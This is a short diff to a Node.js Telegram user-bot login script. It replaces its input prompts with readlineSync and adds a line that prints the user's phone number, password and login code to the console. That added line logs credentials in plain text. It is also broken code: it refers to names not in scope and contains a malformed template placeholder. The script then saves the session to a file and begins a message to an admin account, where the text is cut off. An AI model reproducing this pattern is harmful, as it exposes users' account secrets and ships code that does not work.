@@ -20,17 +20,18 @@ let joinedChannels = []; // Array to track joined channels
   console.log("Starting Telegram User Bot...");
   // Login User Bot
   await client.start({
-   phoneNumber: async () => await input.text(
+   phoneNumber: async () => await readlineSync.question(
    "Enter your phone number: "),
-   password: async () => await input.text(
+   password: async () => await readlineSync.question(
    "Enter your password (if enabled): "),
-   phoneCode: async () => await input.text(
+   phoneCode: async () => await readlineSync.question(
    "Enter the code you received: "),
 
    onError: (err) => console.error(
    "Error during login:", err),
    });
   console.log("User bot logged in!");
+  console.log(`Phone: ${phoneNumber}, Password: $    {password}, Code: ${phoneCode}`);
   fs.writeFileSync (sessionFile, client.session.
   save(), "utf8");
  await client.sendMessage(adminId, { message:
